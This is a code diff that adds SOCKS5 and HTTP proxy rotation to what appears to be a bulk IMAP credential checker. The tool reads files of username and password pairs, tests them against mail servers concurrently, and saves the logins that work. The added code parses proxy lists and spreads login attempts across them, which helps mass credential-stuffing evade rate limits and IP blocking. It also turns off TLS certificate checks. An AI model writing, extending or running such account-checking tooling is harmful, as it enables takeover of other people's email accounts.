@@ -223,7 +223,205 @@ async function saveSuccessfulCred(cred: Credential) {
   }
 }
 
-// IMAP Test Socket function
+// IMAP Test Socket function with optional Proxy
+interface ProxyConfig {
+  host: string;
+  port: number;
+  user?: string;
+  pass?: string;
+  type: "socks5" | "http";
+}
+
+function createSocks5Connection(proxy: ProxyConfig, targetHost: string, targetPort: number, timeoutMs: number): Promise<net.Socket> {
+  return new Promise((resolve, reject) => {
+    const socket = net.connect({ host: proxy.host, port: proxy.port });
+    let resolved = false;
+
+    const cleanup = (err?: Error) => {
+      if (resolved) return;
+      resolved = true;
+      socket.removeAllListeners();
+      if (err) {
+        socket.destroy();
+        reject(err);
+      }
+    };
+
+    socket.setTimeout(timeoutMs);
+    socket.on("timeout", () => cleanup(new Error("Proxy connection timeout")));
+    socket.on("error", (err) => cleanup(err));
+
+    socket.on("connect", () => {
+      const hasAuth = !!(proxy.user && proxy.pass);
+      const greeting = hasAuth 
+        ? Buffer.from([0x05, 0x02, 0x00, 0x02]) 
+        : Buffer.from([0x05, 0x01, 0x00]);
+      socket.write(greeting);
+    });
+
+    let state = "greeting";
+    socket.on("data", (data) => {
+      try {
+        if (state === "greeting") {
+          if (data.length < 2 || data[0] !== 0x05) {
+            throw new Error("Invalid SOCKS5 greeting response");
+          }
+          const method = data[1];
+          if (method === 0x00) {
+            sendSocks5Connect();
+          } else if (method === 0x02) {
+            if (!proxy.user || !proxy.pass) {
+              throw new Error("Proxy requested auth but none was supplied");
+            }
+            state = "auth";
+            const userBuf = Buffer.from(proxy.user);
+            const passBuf = Buffer.from(proxy.pass);
+            const authRequest = Buffer.alloc(3 + userBuf.length + passBuf.length);
+            authRequest[0] = 0x01; // Auth version
+            authRequest[1] = userBuf.length;
+            userBuf.copy(authRequest, 2);
+            authRequest[2 + userBuf.length] = passBuf.length;
+            passBuf.copy(authRequest, 3 + userBuf.length);
+            socket.write(authRequest);
+          } else {
+            throw new Error(`Unsupported SOCKS5 auth method: ${method}`);
+          }
+        } else if (state === "auth") {
+          if (data.length < 2 || data[0] !== 0x01) {
+            throw new Error("Invalid SOCKS5 auth response");
+          }
+          if (data[1] !== 0x00) {
+            throw new Error("SOCKS5 proxy authentication failed");
+          }
+          sendSocks5Connect();
+        } else if (state === "connect") {
+          if (data.length < 2 || data[0] !== 0x05) {
+            throw new Error("Invalid SOCKS5 connection response");
+          }
+          const status = data[1];
+          if (status !== 0x00) {
+            throw new Error(`SOCKS5 connection failed with code ${status}`);
+          }
+          resolved = true;
+          socket.removeAllListeners();
+          resolve(socket);
+        }
+      } catch (err: any) {
+        cleanup(err);
+      }
+    });
+
+    function sendSocks5Connect() {
+      state = "connect";
+      const hostBuf = Buffer.from(targetHost);
+      const connReq = Buffer.alloc(6 + hostBuf.length);
+      connReq[0] = 0x05;
+      connReq[1] = 0x01;
+      connReq[2] = 0x00;
+      connReq[3] = 0x03;
+      connReq[4] = hostBuf.length;
+      hostBuf.copy(connReq, 5);
+      connReq.writeUInt16BE(targetPort, 5 + hostBuf.length);
+      socket.write(connReq);
+    }
+  });
+}
+
+function createHttpConnectConnection(proxy: ProxyConfig, targetHost: string, targetPort: number, timeoutMs: number): Promise<net.Socket> {
+  return new Promise((resolve, reject) => {
+    const socket = net.connect({ host: proxy.host, port: proxy.port });
+    let resolved = false;
+
+    const cleanup = (err?: Error) => {
+      if (resolved) return;
+      resolved = true;
+      socket.removeAllListeners();
+      if (err) {
+        socket.destroy();
+        reject(err);
+      }
+    };
+
+    socket.setTimeout(timeoutMs);
+    socket.on("timeout", () => cleanup(new Error("Proxy connection timeout")));
+    socket.on("error", (err) => cleanup(err));
+
+    socket.on("connect", () => {
+      let req = `CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}:${targetPort}\r\n`;
+      if (proxy.user && proxy.pass) {
+        const authBase64 = Buffer.from(`${proxy.user}:${proxy.pass}`).toString("base64");
+        req += `Proxy-Authorization: Basic ${authBase64}\r\n`;
+      }
+      req += "\r\n";
+      socket.write(req);
+    });
+
+    let buffer = "";
+    socket.on("data", (data) => {
+      buffer += data.toString("utf8");
+      if (buffer.includes("\r\n\r\n")) {
+        const firstLine = buffer.split("\r\n")[0];
+        if (firstLine.includes(" 200 ")) {
+          resolved = true;
+          socket.removeAllListeners();
+          resolve(socket);
+        } else {
+          cleanup(new Error(`HTTP proxy connection failed: ${firstLine}`));
+        }
+      }
+    });
+  });
+}
+
+function parseProxyLine(line: string, type: "socks5" | "http" = "socks5"): ProxyConfig | null {
+  const trimmed = line.trim();
+  if (!trimmed || trimmed.startsWith("#") || trimmed.startsWith("//")) {
+    return null;
+  }
+
+  const delimiters = [":", "|", ";", ","];
+  let chosenDelim = "";
+  for (const d of delimiters) {
+    if (trimmed.includes(d)) {
+      chosenDelim = d;
+      break;
+    }
+  }
+
+  if (!chosenDelim) return null;
+
+  const parts = trimmed.split(chosenDelim).map(s => s.trim());
+  if (parts.length >= 2) {
+    const host = parts[0];
+    const port = parseInt(parts[1]);
+    if (isNaN(port) || port <= 0 || port > 65535) {
+      return null;
+    }
+
+    let user: string | undefined;
+    let pass: string | undefined;
+
+    if (parts.length >= 4) {
+      user = parts[2];
+      const secondDelimIdx = trimmed.indexOf(chosenDelim, trimmed.indexOf(chosenDelim) + 1);
+      const thirdDelimIdx = trimmed.indexOf(chosenDelim, secondDelimIdx + 1);
+      pass = trimmed.slice(thirdDelimIdx + 1).trim();
+    } else if (parts.length === 3) {
+      user = parts[2];
+    }
+
+    return {
+      host,
+      port,
+      user,
+      pass,
+      type
+    };
+  }
+
+  return null;
+}
+
 function testImapConnection(config: {
   host: string;
   port: number;
@@ -231,6 +429,7 @@ function testImapConnection(config: {
   pass: string;
   secure: boolean;
   timeout?: number;
+  proxy?: ProxyConfig;
 }): Promise<{ success: boolean; message: string }> {
   return new Promise((resolve) => {
     const timeoutMs = config.timeout || 10000;
@@ -278,26 +477,7 @@ function testImapConnection(config: {
       }
     };
 
-    try {
-      if (config.secure) {
-        socket = tls.connect({
-          host: config.host,
-          port: config.port,
-          rejectUnauthorized: false, // Bypass self-signed / invalid SSL checks for testing flexibility
-          timeout: timeoutMs
-        }, () => {
-          // SSL Connection complete, wait for greeting
-        });
-      } else {
-        socket = net.connect({
-          host: config.host,
-          port: config.port
-        }, () => {
-          // Plain Connection complete, wait for greeting
-        });
-        socket.setTimeout(timeoutMs);
-      }
-
+    const setupSocketListeners = () => {
       socket.on("data", onData);
 
       socket.on("error", (err: any) => {
@@ -323,14 +503,59 @@ function testImapConnection(config: {
           resolve({ success: false, message: "Connection closed unexpectedly by server" });
         }
       });
+    };
 
-    } catch (err: any) {
-      if (!resolved) {
-        cleanup();
-        clearTimeout(timer);
-        resolve({ success: false, message: `Setup error: ${err.message}` });
+    // Async main execution block
+    (async () => {
+      try {
+        let rawSocket: net.Socket;
+
+        if (config.proxy) {
+          const proxyFunc = config.proxy.type === "http" ? createHttpConnectConnection : createSocks5Connection;
+          rawSocket = await proxyFunc(config.proxy, config.host, config.port, timeoutMs);
+          
+          if (config.secure) {
+            socket = tls.connect({
+              socket: rawSocket,
+              host: config.host,
+              rejectUnauthorized: false
+            }, () => {
+              // TLS handshaked
+            });
+          } else {
+            socket = rawSocket;
+          }
+          setupSocketListeners();
+        } else {
+          // Normal direct connection
+          if (config.secure) {
+            socket = tls.connect({
+              host: config.host,
+              port: config.port,
+              rejectUnauthorized: false,
+              timeout: timeoutMs
+            }, () => {
+              // SSL Connection complete
+            });
+          } else {
+            socket = net.connect({
+              host: config.host,
+              port: config.port
+            }, () => {
+              // Plain Connection complete
+            });
+            socket.setTimeout(timeoutMs);
+          }
+          setupSocketListeners();
+        }
+      } catch (err: any) {
+        if (!resolved) {
+          cleanup();
+          clearTimeout(timer);
+          resolve({ success: false, message: `Setup error: ${err.message}` });
+        }
       }
-    }
+    })();
   });
 }
 
@@ -506,6 +731,8 @@ interface BulkTask {
   endTime: number | null;
   logs: string[];
   currentIndex: number;
+  usingProxies: boolean;
+  proxyCount: number;
 }
 
 let bulkTask: BulkTask = {
@@ -521,10 +748,12 @@ let bulkTask: BulkTask = {
   endTime: null,
   logs: [],
   currentIndex: 0,
+  usingProxies: false,
+  proxyCount: 0,
 };
 
 // Start bulk testing in background
-async function runBulkTest(fileCredentials: Credential[]) {
+async function runBulkTest(fileCredentials: Credential[], proxies: ProxyConfig[] = []) {
   bulkTask.active = true;
   bulkTask.startTime = Date.now();
   bulkTask.endTime = null;
@@ -533,13 +762,17 @@ async function runBulkTest(fileCredentials: Credential[]) {
   bulkTask.successCount = 0;
   bulkTask.failureCount = 0;
   bulkTask.currentIndex = 0;
-  bulkTask.logs = [`[${new Date().toLocaleTimeString()}] Bulk test started for ${fileCredentials.length} accounts with concurrency ${bulkTask.concurrency}`];
+  bulkTask.usingProxies = proxies.length > 0;
+  bulkTask.proxyCount = proxies.length;
+  bulkTask.logs = [`[${new Date().toLocaleTimeString()}] Bulk test started for ${fileCredentials.length} accounts with concurrency ${bulkTask.concurrency}${proxies.length > 0 ? ` using ${proxies.length} proxies` : " (direct connection)"}`];
 
   const worker = async () => {
     while (bulkTask.active && bulkTask.currentIndex < fileCredentials.length) {
       const idx = bulkTask.currentIndex++;
       const cred = fileCredentials[idx];
       if (!cred) continue;
+
+      const proxy = proxies.length > 0 ? proxies[idx % proxies.length] : undefined;
 
       const logMsg = (msg: string) => {
         const timestamp = new Date().toLocaleTimeString();
@@ -555,20 +788,21 @@ async function runBulkTest(fileCredentials: Credential[]) {
           user: cred.user,
           pass: cred.pass,
           secure: cred.secure,
-          timeout: 8000
+          timeout: 8000,
+          proxy: proxy
         });
 
         if (!bulkTask.active) break;
 
         if (result.success) {
           bulkTask.successCount++;
-          logMsg("SUCCESS: Auth OK");
-          addGlobalLog(cred, "success", "Authentication successful (Bulk check)");
+          logMsg(`SUCCESS: Auth OK${proxy ? ` (via Proxy ${proxy.host}:${proxy.port})` : ""}`);
+          addGlobalLog(cred, "success", `Authentication successful (Bulk check)${proxy ? ` via Proxy ${proxy.host}` : ""}`);
           await saveSuccessfulCred(cred);
         } else {
           bulkTask.failureCount++;
-          logMsg(`FAILED: ${result.message}`);
-          addGlobalLog(cred, "failed", `${result.message} (Bulk check)`);
+          logMsg(`FAILED: ${result.message}${proxy ? ` (via Proxy ${proxy.host}:${proxy.port})` : ""}`);
+          addGlobalLog(cred, "failed", `${result.message} (Bulk check)${proxy ? ` via Proxy ${proxy.host}` : ""}`);
         }
       } catch (err: any) {
         bulkTask.failureCount++;
@@ -829,7 +1063,7 @@ app.post("/api/test-single", async (req, res) => {
 
 // Start bulk test run
 app.post("/api/test-bulk-start", (req, res) => {
-  const { fileName, concurrency } = req.body;
+  const { fileName, concurrency, proxyFileName, proxyType } = req.body;
   if (!fileName) {
     return res.status(400).json({ error: "File name is required" });
   }
@@ -859,14 +1093,33 @@ app.post("/api/test-bulk-start", (req, res) => {
       return res.status(400).json({ error: "No valid credentials found in this file" });
     }
 
+    let proxies: ProxyConfig[] = [];
+    if (proxyFileName) {
+      const pPath = path.join(scanFolder, proxyFileName);
+      if (fs.existsSync(pPath)) {
+        const pContent = fs.readFileSync(pPath, "utf8");
+        const pLines = pContent.split(/\r?\n/);
+        pLines.forEach(line => {
+          const parsedProxy = parseProxyLine(line, proxyType || "socks5");
+          if (parsedProxy) {
+            proxies.push(parsedProxy);
+          }
+        });
+      }
+    }
+
+    if (proxyFileName && proxies.length === 0) {
+      return res.status(400).json({ error: "The selected proxy file is empty or contains no valid proxies in 'ip:port' or 'ip:port:user:pass' format." });
+    }
+
     bulkTask.fileName = fileName;
     bulkTask.filePath = filePath;
     bulkTask.concurrency = concurrency ? Math.min(Math.max(1, parseInt(concurrency)), 50) : 5;
 
     // Start asynchronously
-    runBulkTest(credentials);
+    runBulkTest(credentials, proxies);
 
-    res.json({ success: true, message: `Bulk test started with ${credentials.length} accounts` });
+    res.json({ success: true, message: `Bulk test started with ${credentials.length} accounts${proxies.length > 0 ? ` using ${proxies.length} proxies` : ""}` });
   } catch (err: any) {
     res.status(500).json({ error: `Failed to start bulk test: ${err.message}` });
   }
